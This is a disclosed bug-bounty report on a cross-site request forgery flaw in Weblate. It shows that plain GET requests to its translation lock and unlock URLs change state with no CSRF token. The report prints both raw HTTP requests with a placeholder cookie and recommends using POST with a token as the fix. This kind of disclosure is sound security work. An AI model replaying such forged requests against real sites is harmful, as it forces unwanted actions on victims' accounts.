# CSRF : Lock and Unlock Translation

## Report Details
- **Report ID**: 223345
- **URL**: https://hackerone.com/reports/223345
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-04-24T09:49:42.632Z
- **Disclosed**: 2017-05-17T18:03:36.341Z

## Reporter
- **Username**: jaypatel
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: weblate

## Vulnerability Information
**Description :**
Attacker can force to victim for Lock and Unlock Translation.

**That HTTP Request :**
```
GET /lock/aptoide-uploader/strings/ka/ HTTP/1.1
Host: hosted.weblate.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://hosted.weblate.org/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
Cookie:  cookie_here
```
```
GET /unlock/aptoide-uploader/strings/ka/ HTTP/1.1
Host: hosted.weblate.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://hosted.weblate.org/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
Cookie: cookie_here

```
**Fix :**
Make that Request POST , and add a CSRF token there.

Best Regards',
Jay Patel

## Attachments
No attachments
